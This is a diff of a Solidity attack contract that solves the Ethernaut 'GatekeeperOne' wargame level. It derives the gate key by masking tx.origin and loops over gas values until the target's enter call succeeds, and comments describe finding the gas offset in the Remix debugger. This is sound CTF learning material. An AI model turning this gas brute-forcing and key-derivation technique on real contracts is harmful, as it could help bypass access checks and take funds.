@@ -3,6 +3,7 @@ pragma solidity ^0.8.0;
 
 import '../contracts/GatekeeperOne.sol';
 
+
 /* Solution using Remix
 
     First gate
@@ -25,33 +26,45 @@ import '../contracts/GatekeeperOne.sol';
  */
 
 contract HackGatekeeperOne {
-    GatekeeperOne public originalContract;
-    // If we use this mask with out address, it will have the first 4 bytes and the last 2 bytes
-    // The 2 bytes left in the middle are gonna be 0
-    uint64 mask64 = 0xffffffff0000ffff;
-    bytes8 key;
+  GatekeeperOne public originalContract;
+  // If we use this mask with out address, it will have the first 4 bytes and the last 2 bytes
+  // The 2 bytes left in the middle are gonna be 0
+  uint64 mask64 = 0xffffffff0000ffff;
+  bytes8 key;
 
-    constructor(address contractAddress) {
-        // Set the original contract address in the constructor
-        originalContract = GatekeeperOne(contractAddress);
-    }
+  constructor (address contractAddress) {
+    // Set the original contract address in the constructor
+    originalContract = GatekeeperOne(contractAddress);
+  }
 
-    function hack() public {
-        // Calculate the key and save it
-        key = bytes8(uint64(uint160(tx.origin) & mask64));
-        // It's very difficult to calculate the exact amount of gas
-        // For me, the exact amount of gas consumpted until it reaches the execution of gasLeft was 271
-        // But when I use it with the ethernaut contract, it fails
-        // We also need to multiply 8191 for three, otherwise there will not be enought gas
-        // So, what I did was to use and approximate and a for loop
-        // We seize that the call function doesn't revert, so we execute it over and over again
-        // Until it succeeded
-        for (uint256 i = 0; i < 150; i++) {
-            (bool success,) =
-                address(originalContract).call{gas: i + 200 + (8191 * 3)}(abi.encodeWithSignature('enter(bytes8)', key));
-            if (success) {
-                break;
-            }
+  function hack() public {
+    // Calculate the key and save it
+    key = bytes8(uint64(uint160(tx.origin) & mask64));
+    // It's very difficult to calculate the exact amount of gas
+    // For me, the exact amount of gas consumpted until it reaches the execution of gasLeft was 271
+    // But when I use it with the ethernaut contract, it fails
+    // We also need to multiply 8191 for three, otherwise there will not be enought gas
+    // So, what I did was to use and approximate and a for loop
+    // We seize that the call function doesn't revert, so we execute it over and over again
+    // Until it succeeded
+    for (uint256 i = 0; i < 150; i++) {
+        (bool success, ) = address(originalContract).call{gas: i + 200 + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", key));
+        if (success) {
+            break;
         }
     }
+  }
 }
+
+/* Remix
+
+  We're going to deploy an exact copy of GatekeeperOne with remix
+  Doing this allows you to use the debbug console into this contract as well
+  Then we're going to search into the opcode the one called GAS
+  We're gonna see the remaining gas and how much gas consumes this opcode
+  We need sum of both values to be 8191
+  We rest 8191 to the amount of gas we used and we get the number 271
+
+  Once we have this contract, we deployed with injected web3 and it will work
+
+*/
